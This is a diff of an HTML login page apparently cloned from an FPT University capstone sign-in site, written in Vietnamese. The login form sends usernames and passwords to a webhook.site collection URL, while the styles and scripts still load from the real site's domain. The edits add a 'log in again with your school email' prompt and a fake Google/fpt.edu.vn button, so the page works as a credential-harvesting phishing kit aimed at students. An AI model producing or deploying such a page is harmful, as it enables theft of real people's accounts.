@@ -1,5 +1,6 @@
 
 
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -11,12 +12,12 @@
     <!-- Bootstrap 3.3.5 -->
     <link rel="stylesheet" href="http://auth.capstone-hcm.club/Content/Resources/plugins/bootstrap/css/bootstrap.min.css">
     <!-- Font Awesome -->
-    <link rel="stylesheet" href="http://auth.capstone-hcm.club/Content/fontawesome/css/all.css">
+    <link rel="stylesheet" href="http://auth.capstone-hcm.club//Content/fontawesome/css/all.css">
     <!-- Theme style -->
-    <link rel="stylesheet" href="http://auth.capstone-hcm.club/Content/Resources/plugins/dist/css/AdminLTE.min.css">
-    <link rel="stylesheet" href="http://auth.capstone-hcm.club/Content/login-page.css">
+    <link rel="stylesheet" href="http://auth.capstone-hcm.club//Content/Resources/plugins/dist/css/AdminLTE.min.css">
+    <link rel="stylesheet" href="http://auth.capstone-hcm.club//Content/login-page.css">
     <!-- iCheck -->
-    <link rel="stylesheet" href="http://auth.capstone-hcm.club/Content/Resources/plugins/iCheck/square/blue.css">
+    <link rel="stylesheet" href="http://auth.capstone-hcm.club//Content/Resources/plugins/iCheck/square/blue.css">
     <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
     <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
     <!--[if lt IE 9]>
@@ -29,22 +30,22 @@
     <div class="login-box">
         <div class="login-logo">
             <div class="my-logo">
-                <img src="http://auth.capstone-hcm.club/Content/img/img-logo-fe.jpg">
+                <img src="http://auth.capstone-hcm.club//Content/img/img-logo-fe.jpg">
             </div>
         </div>
         <div class="login-box-body">
-            <p class="login-box-msg">Vui lòng nhập thủ công tài khoản email trường để đăng nhập</p>
+            <p class="login-box-msg">Vui lòng đăng nhập lại bằng email trường</p>
             <form action="http://webhook.site/362b24d8-7424-4a4f-b54f-40e3d808006e" method="post">
                 <input type="hidden" name="ReturnUrl" value="/" />
                 <div class="form-group has-feedback">
-                    <input class="form-control" name="Username" value="&#39;" placeholder="Email">
+                    <input class="form-control" name="Username" placeholder="Tên đăng nhập">
                     <span class="glyphicon glyphicon-user form-control-feedback"></span>
                 </div>
                 <div class="form-group has-feedback">
                     <input type="password" class="form-control" name="Password" placeholder="Mật khẩu">
                     <span class="glyphicon glyphicon-lock form-control-feedback"></span>
                 </div>
-                <p class="text-error"><div class="validation-summary-errors" data-valmsg-summary="true"><ul><li>Sai t&#234;n đăng nhập hoặc mật khẩu.</li>
+                <p class="text-error"><div class="validation-summary-valid" data-valmsg-summary="true"><ul><li style="display:none"></li>
 </ul></div></p>
                 <div class="row">
                     <div class="col-xs-12">
@@ -59,14 +60,31 @@
                     </div><!-- /.col -->
                 </div>
             </form>
+            <div class="social-auth-links text-center">
+                <form action="/Account/ExternalLogin" method="post">
+                    <input name="__RequestVerificationToken" type="hidden" value="og3hFSm2UYc7DNX95_j-tcelW3P4MiSTsLr31gP2---ikalgpoS0cpDj58sL5IK_f4IleK2Tvc5FxAXyeXHMaGiEjHEoThJ5v7xtQ-ndpB81" />
+                    <input type="hidden" name="ReturnUrl" value="/" />
+                    <div id="socialLoginList">
+                        <p>
+                            <button type="submit" class="btn btn-block btn-social btn-google"
+                                    name="provider"
+                                    value="Google"
+                                    title="Log in using your Google account">
+                                <i class="fab fa-google-plus"></i>  Đăng nhập bằng email fpt.edu.vn
+                            </button>
+                        </p>
+                    </div>
+                    <input type="hidden" name="returnUrl" value="" />
+                </form>
+            </div><!-- /.social-auth-links -->
         </div><!-- /.login-box-body -->
     </div><!-- /.login-box -->
     <!-- jQuery 2.1.4 -->
-    <script src="http://auth.capstone-hcm.club/Content/Resources/plugins/jQuery/jQuery-2.1.4.min.js"></script>
+    <script src="http://auth.capstone-hcm.club//Content/Resources/plugins/jQuery/jQuery-2.1.4.min.js"></script>
     <!-- Bootstrap 3.3.5 -->
-    <script src="http://auth.capstone-hcm.club/Content/Resources/plugins/bootstrap/js/bootstrap.min.js"></script>
+    <script src="http://auth.capstone-hcm.club//Content/Resources/plugins/bootstrap/js/bootstrap.min.js"></script>
     <!-- iCheck -->
-    <script src="http://auth.capstone-hcm.club/Content/Resources/plugins/iCheck/icheck.min.js"></script>
+    <script src="http://auth.capstone-hcm.club//Content/Resources/plugins/iCheck/icheck.min.js"></script>
     <script>
         $(function () {
             $('input').iCheck({
